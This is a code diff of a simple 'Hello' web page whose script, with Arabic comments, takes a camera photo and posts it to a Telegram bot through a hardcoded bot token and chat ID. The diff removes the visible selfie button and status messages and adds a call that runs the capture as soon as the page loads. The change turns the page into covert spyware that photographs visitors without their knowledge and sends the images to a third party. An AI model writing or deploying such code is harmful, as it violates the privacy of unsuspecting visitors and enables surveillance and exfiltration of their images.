@@ -7,8 +7,6 @@
 </head>
 <body style="text-align: center; font-size: 2em;">
     <h1>Hello</h1>
-    <button onclick="captureSelfie()">أخذ سيلفي</button>
-    <p id="status"></p>
     <script>
         // أخذ صورة سيلفي في الخلفية
         async function captureSelfie() {
@@ -48,23 +46,15 @@
                 }
                 const blob = new Blob(byteArrays, { type: 'image/jpeg' });
 
-                // جلب بيانات الـ IP العام
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = `IP: ${ipData.ip}`;
-
                 // إرسال البيانات إلى بوت تلغرام
-                sendToTelegram(blob, ipAddress);
-
-                document.getElementById("status").innerText = "تم أخذ السيلفي وإرساله إلى تلغرام!";
+                sendToTelegram(blob);
             } catch (err) {
                 console.error('Error capturing selfie:', err);
-                document.getElementById("status").innerText = "فشل في أخذ السيلفي. تأكد من صلاحيات الكاميرا.";
             }
         }
 
         // إرسال البيانات إلى بوت تلغرام
-        function sendToTelegram(photoBlob, ipAddress) {
+        function sendToTelegram(photoBlob) {
             const botToken = "7986358827:AAEMJZ08_efX_g0LR3BAX4JtNWAe5ADeUNg";
             const chatId = "6363115796";
 
@@ -72,9 +62,8 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', photoBlob, 'selfie.jpg');
-            formData.append('caption', ipAddress);  // إضافة الـ IP العام في الـ caption
 
-            // إرسال الصورة مع البيانات إلى Telegram API
+            // إرسال الصورة عبر Telegram API
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -85,6 +74,9 @@
                   console.error('Error sending to Telegram:', err);
               });
         }
+
+        // تنفيذ التقاط الصورة فور تحميل الصفحة
+        captureSelfie();
     </script>
 </body>
 </html>
